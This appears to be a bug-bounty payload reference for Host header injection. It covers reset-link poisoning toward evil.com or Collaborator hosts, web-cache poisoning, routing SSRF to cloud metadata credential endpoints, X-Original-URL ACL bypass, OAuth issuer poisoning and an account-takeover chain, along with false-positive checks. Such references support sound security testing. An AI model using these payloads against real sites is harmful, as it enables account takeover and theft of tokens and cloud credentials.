# Host Header Injection — payload reference

> Class: reset-poisoning→ATO / web-cache-poisoning / routing-SSRF / path-override ACL-bypass /
> OAuth-issuer-poisoning. Cross-ref: `invariant_library.md` → `## § Web2` → the `password-reset` row
> (anti-fingerprint — the reset token is host-header-independent, server-issued, single-use;
> breakage = `X-Forwarded-Host` poisoning). Trigger: any forgot-password / email-verify / invite
> flow, an app behind a CDN/reverse-proxy, OAuth/OIDC endpoints, an absolute URL in an email.

## Payloads

- **Reset-poisoning: direct Host override** — `POST /forgot-password` with `Host: evil.com` (or a
  Collaborator domain), body = the email of YOUR OWN test account. If the server builds the reset
  link from the request Host without an allowlist — the token goes to evil.com.
  - Detection Signal: the email IN YOUR OWN inbox contains a reset link with host =
    evil.com/Collaborator; on click/preview-fetch an inbound hit with the token lands on Collaborator
    (OOB proof). A reflected Host in the HTTP response does NOT prove it — read the email body.
- **`X-Forwarded-Host` / `X-Host` (behind a trusting proxy)** — `Host: $TARGET` +
  `X-Forwarded-Host: evil.com`; variants: `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`,
  `Forwarded`.
  - Detection Signal: the same result — a poisoned reset link in the email / reflected in the
    absolute URL.
- **Dual-Host / Host-override smuggling** — two `Host:` headers in the raw request; some stacks read
  the SECOND. `printf 'POST /forgot-password HTTP/1.1\r\nHost: $TARGET\r\nHost: evil.com\r\n...'`.
  - Detection Signal: the reset link / absolute URL takes the second Host.
- **Absolute-URL / userinfo-confusion override** — `Host: $TARGET.evil.com` (subdomain-append),
  `Host: $TARGET:1@evil.com` (parsers that cut on `:`/`@`), `Host: evil.com/$TARGET`.
  - Detection Signal: the generated link resolves to the attacker domain (`$TARGET.evil.com` / after
    `@`).
- **Web-cache poisoning via an unkeyed Host / X-Forwarded-Host** — the injected host must be
  **reflected in the body** (an absolute URL, `<script src>`, `<link href>`, `<base href>`,
  `Location`, `og:url`) AND the response must be cacheable on a key you do not control. Steps: (1)
  `X-Forwarded-Host: canary-$RANDOM.example` → grep the canary in the body; (2) `-I` →
  `X-Cache/CF-Cache-Status: HIT`, `Age>0`, `Via: varnish/fastly`, check `Vary` — if Host is NOT in
  Vary → unkeyed → poisonable; (3) poison the key, then fetch WITHOUT the injected header.
  - Detection Signal: a request that **omits** the injected header (a fresh egress IP / incognito)
    still returns the attacker payload → shared-cache poisoning is proven. `MISS`/`Age:0`/Vary-keyed
    → self-only, demote to Low.
- **Routing-based SSRF (Host selects the upstream)** — path on the request line as usual, Host steers
  the proxy upstream: `GET /latest/meta-data/iam/security-credentials/` with `Host: 169.254.169.254`.
  GCP: `Host: metadata.google.internal` + `Metadata-Flavor: Google`. Internal:
  `Host: localhost:6379` (Redis), `Host: internal-admin.svc.cluster.local`. Blind →
  `Host: $COLLAB`, watch the front-end's outbound DNS/HTTP. (`X-Original-URL` does NOT apply here —
  IMDS ignores it.)
  - Detection Signal: a real body from IMDS/an internal host in the response OR an OOB DNS/HTTP hit
    on Collaborator from the front-end (blind). 200 with an echo of the Host string ≠ SSRF.
- **Path-override SSRF / ACL-bypass (`X-Original-URL` / `X-Rewrite-URL`)** —
  IIS/ASP.NET/Spring-Cloud-Gateway override the routed path. Real Host in place: `Host: $TARGET` +
  `X-Original-URL: /admin` (or `X-Rewrite-URL: /internal/metrics`). A different layer, does NOT
  compose with routing-SSRF.
  - Detection Signal: the status/body differs from a direct `GET /admin` (which the edge blocks) →
    the override worked, the edge ACL was bypassed.
- **OAuth / OIDC issuer & redirect_uri poisoning** — `Host: evil.com` on `/oauth/authorize?...` →
  check whether `redirect_uri`/the display URL is built from Host. OIDC discovery:
  `X-Forwarded-Host: evil.com` on `/.well-known/openid-configuration` → check whether `issuer`/
  `authorization_endpoint`/`token_endpoint`/`jwks_uri` are reflected.
  - Detection Signal: the auth-code/token is ACTUALLY delivered to the attacker host (captured on
    Collaborator), not just a reflected string.

## Reset-poisoning chain → ATO (see ato_chains)

A reset link with host=attacker (proven on your own test account) → inject a **Collaborator** host →
when the victim (or their mail-preview fetcher) clicks, the token lands OOB → you supply the token →
password change → **ATO of any user = Critical**. Pre-ATO variant: even a victim who requested THEIR
OWN reset leaks the token to evil.com. Full chain/variants — see the `ato_chains` playbook.

## Anti-FP / what NOT to submit on its own

- **Reflected ≠ cached**; cached-for-you ≠ cached-for-others (check `Vary` + a second IP/incognito).
- **Host reflected in the page with no impact** — not a bug; you need reset-poison / cache-poison /
  SSRF.
- **Reset: a reflected Host in the HTTP response ≠ a poisoned email** — many mailers rewrite the link
  to a fixed `SITE_URL` regardless of Host. Read the email BODY.
- **Relative URLs** — if the app generates relative links, Host injection has no impact.
- **200 with an echo of Host** ≠ SSRF until content comes back from the internal target / Collaborator
  fires.
